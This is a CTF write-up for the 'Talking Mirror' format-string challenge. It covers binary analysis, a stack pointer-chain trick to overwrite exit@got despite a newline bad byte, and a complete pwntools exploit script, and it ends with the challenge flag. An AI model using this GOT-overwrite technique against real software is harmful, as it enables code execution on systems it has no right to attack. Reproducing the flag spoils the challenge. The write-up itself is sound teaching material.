
# Talking Mirror - CTF Writeup

**Challenge:** Talking Mirror
**Category:** Pwn / Format String
**Command:** `ncat --ssl talking-mirror.ctf.prgy.in 1337`

> **Description:** This cursed mirror just repeats everything I say. I asked it for the flag and it just mocks me...

---

## 1. Initial Reconnaissance & Static Analysis

We began by analyzing the binary's security protections and decompiling the source code.

### Security Check

We used `checksec` to verify the binary protections:

```bash
checksec challenge
[*] '/home/kali/Downloads/pragyan ctf/mirror/vuln'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO (GOT is writable)
    Stack:       No canary found
    NX:          NX enabled (No shellcode)
    PIE:         No PIE (Static code addresses)
    SHSTK/IBT:   Enabled (Protects against simple ROP)

```

### Decompilation (Ghidra)

The binary contains a `vuln()` function that repeats user input using `printf()` without a format specifier. This creates a classic **Format String Vulnerability**, allowing for arbitrary reads and writes.

```c
undefined8 vuln(void) {
  char local_78 [104];
  fgets(local_78, 100, stdin);
  printf(local_78);  // <--- Vulnerability here
  vuln();            // Recursive call
  return 0;
}

```

### Finding the Target Address

To find the entry point for the win function, we used GDB:

```bash
gdb ./challenge
(gdb) disass win
Dump of assembler code for function win:
   0x0000000000401216 <+0>:     push   rbp
   ...

```

**Target Win Address:** `0x401216`

---

## 2. Technical Hurdles

### The "Bad Char" Obstacle (`exit@got`)

Our first instinct was to overwrite `exit@got` (`0x400a50`) because the `vuln()` function loops recursively. We needed to break the loop or redirect execution when `exit` is eventually called.

* **The Problem:** The address `0x400a50` contains the byte `0x0a`.
* **The Failure:** `0x0a` is the ASCII code for **Newline (`\n`)**. Since the binary reads input via `fgets()`, it stops reading the moment it sees `0x0a`. This physically prevents us from sending the target address in our payload using standard packing.

### The Read-Only Trap (`.fini_array`)

We attempted to target `.fini_array` (`0x403e18`), a common alternative to GOT overwrites.

* **The Failure:** Despite `checksec` reporting "Partial RELRO," GDB confirmed this memory segment was mapped as **Read-Only** during execution. Any attempt to write here resulted in a `SIGSEGV` crash.

---

## 3. The Solution: Stack Pointer Chaining

To bypass the newline restriction, we had to find the address `0x400a50` without sending it. We realized we could construct it on the stack using existing pointers.

By examining the stack (`x/40gx $rsp` in GDB), we found a **Pointer Chain**:

* **Offset 20** contained a stack address that pointed to **Offset 22**.

### The Strategy

1. **Stage 1:** Use the pointer at **Offset 20** to write the value `0x400a50` (address of `exit@got`) into the memory location it points to (which is **Offset 22**).
2. **Stage 2:** Now that Offset 22 contains `0x400a50`, use **Offset 22** as a pointer to write the value `0x401216` (address of `win`) into the location *it* points to (which is now `exit@got`).

This allows us to overwrite the GOT entry without ever sending the forbidden `0x0a` byte in our raw input.

---

## 4. Final Exploit: Remote Brute Force

Since stack offsets often differ slightly between local and remote environments (due to environment variables), I wrote a script to brute-force the "skips" (the padding needed to reach the stack pointer).

### Successful Exploit Script

```python
from pwn import *
import re

exe = ELF('./challenge')
context.binary = exe

def attempt(skips):
    try:
        p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True, timeout=5)
        exit_got = 0x400a50
        win_addr = 0x401216 
        
        # 1. Walk to the stack pointer (Stage 1)
        # We use %c to simply advance the internal printf pointer
        payload = b"%c" * skips
        
        # 2. Write exit@got into Offset 22 (via Offset 20)
        # We calculate how many characters to print to reach the integer value of 0x400a50
        needed_1 = exit_got - skips
        payload += f"%{needed_1}c".encode()
        payload += b"%lln" 
        
        # 3. Write win_addr into exit@got (via Offset 22)
        # Now we calculate the difference to reach 0x401216
        needed_2 = win_addr - exit_got
        payload += f"%{needed_2}c".encode()
        payload += b"%lln" 
        
        p.sendline(payload)
        output = p.recvrepeat(timeout=3)
        
        if b'{' in output:
            print(f"\n[!] SUCCESS WITH SKIPS: {skips} (Offset {skips + 2})")
            match = re.search(b'([a-zA-Z0-9_]+{.*?})', output)
            print(f"FLAG: {match.group(1).decode()}")
            return True
        p.close()
        return False
    except: return False

# Brute force the offset range
for s in range(10, 35):
    if attempt(s): break

```

---

## 5. Conclusion

The brute force successfully identified **18 skips** (corresponding to Offset 20) as the correct entry point for the chain.

**Why it worked:**

1. **Newline Bypass:** We avoided sending `0x0a` in our input; we "manufactured" the address `0x400a50` on the stack using existing pointers.
2. **Sequential Writing:** Using `%c` to increment the internal `printf` character counter allowed us to write two different large addresses in a single execution flow.
3. **Address Discovery:** `disass win` gave us the exact location to jump to.

**Flag:** `p_ctf{7hETAlk!n6M!RR0RSpOkeONE7OOmANyT!m3S}`
